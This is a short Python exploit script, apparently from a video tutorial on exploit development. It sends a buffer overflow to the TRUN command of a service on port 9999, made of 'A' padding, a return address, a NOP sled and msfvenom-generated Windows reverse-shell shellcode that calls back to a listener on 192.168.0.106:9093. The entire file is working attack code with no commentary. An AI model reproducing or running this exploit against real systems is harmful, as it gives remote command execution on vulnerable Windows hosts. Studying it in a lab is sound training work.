import socket

# @YT https://youtu.be/sZSMg6F8mv4

ip_addr = '192.168.0.106'
porta = 9999

prefix = b"TRUN /.:/ "
offset = 2002
nop_sled = b"\x90" * 32
retorno =  b"\xaf\x11\x50\x62"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.106 LPORT=9093 exitfunc=thread -b "\x00" -f py -v shellcode
shellcode =  b""
shellcode += b"\xda\xc3\xbe\xc8\x87\x36\xe9\xd9\x74\x24\xf4"
shellcode += b"\x5f\x29\xc9\xb1\x52\x31\x77\x17\x03\x77\x17"
shellcode += b"\x83\x0f\x83\xd4\x1c\x73\x64\x9a\xdf\x8b\x75"
shellcode += b"\xfb\x56\x6e\x44\x3b\x0c\xfb\xf7\x8b\x46\xa9"
shellcode += b"\xfb\x60\x0a\x59\x8f\x05\x83\x6e\x38\xa3\xf5"
shellcode += b"\x41\xb9\x98\xc6\xc0\x39\xe3\x1a\x22\x03\x2c"
shellcode += b"\x6f\x23\x44\x51\x82\x71\x1d\x1d\x31\x65\x2a"
shellcode += b"\x6b\x8a\x0e\x60\x7d\x8a\xf3\x31\x7c\xbb\xa2"
shellcode += b"\x4a\x27\x1b\x45\x9e\x53\x12\x5d\xc3\x5e\xec"
shellcode += b"\xd6\x37\x14\xef\x3e\x06\xd5\x5c\x7f\xa6\x24"
shellcode += b"\x9c\xb8\x01\xd7\xeb\xb0\x71\x6a\xec\x07\x0b"
shellcode += b"\xb0\x79\x93\xab\x33\xd9\x7f\x4d\x97\xbc\xf4"
shellcode += b"\x41\x5c\xca\x52\x46\x63\x1f\xe9\x72\xe8\x9e"
shellcode += b"\x3d\xf3\xaa\x84\x99\x5f\x68\xa4\xb8\x05\xdf"
shellcode += b"\xd9\xda\xe5\x80\x7f\x91\x08\xd4\x0d\xf8\x44"
shellcode += b"\x19\x3c\x02\x95\x35\x37\x71\xa7\x9a\xe3\x1d"
shellcode += b"\x8b\x53\x2a\xda\xec\x49\x8a\x74\x13\x72\xeb"
shellcode += b"\x5d\xd0\x26\xbb\xf5\xf1\x46\x50\x05\xfd\x92"
shellcode += b"\xf7\x55\x51\x4d\xb8\x05\x11\x3d\x50\x4f\x9e"
shellcode += b"\x62\x40\x70\x74\x0b\xeb\x8b\x1f\xf4\x44\x93"
shellcode += b"\xb5\x9c\x96\x93\x6a\xd8\x1e\x75\x06\xf2\x76"
shellcode += b"\x2e\xbf\x6b\xd3\xa4\x5e\x73\xc9\xc1\x61\xff"
shellcode += b"\xfe\x36\x2f\x08\x8a\x24\xd8\xf8\xc1\x16\x4f"
shellcode += b"\x06\xfc\x3e\x13\x95\x9b\xbe\x5a\x86\x33\xe9"
shellcode += b"\x0b\x78\x4a\x7f\xa6\x23\xe4\x9d\x3b\xb5\xcf"
shellcode += b"\x25\xe0\x06\xd1\xa4\x65\x32\xf5\xb6\xb3\xbb"
shellcode += b"\xb1\xe2\x6b\xea\x6f\x5c\xca\x44\xde\x36\x84"
shellcode += b"\x3b\x88\xde\x51\x70\x0b\x98\x5d\x5d\xfd\x44"
shellcode += b"\xef\x08\xb8\x7b\xc0\xdc\x4c\x04\x3c\x7d\xb2"
shellcode += b"\xdf\x84\x9d\x51\xf5\xf0\x35\xcc\x9c\xb8\x5b"
shellcode += b"\xef\x4b\xfe\x65\x6c\x79\x7f\x92\x6c\x08\x7a"
shellcode += b"\xde\x2a\xe1\xf6\x4f\xdf\x05\xa4\x70\xca"

buffer = b"A" * offset + retorno + nop_sled + shellcode

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_addr, porta))
    s.send((prefix + buffer))
    print(":)")

except:
    print(":(")
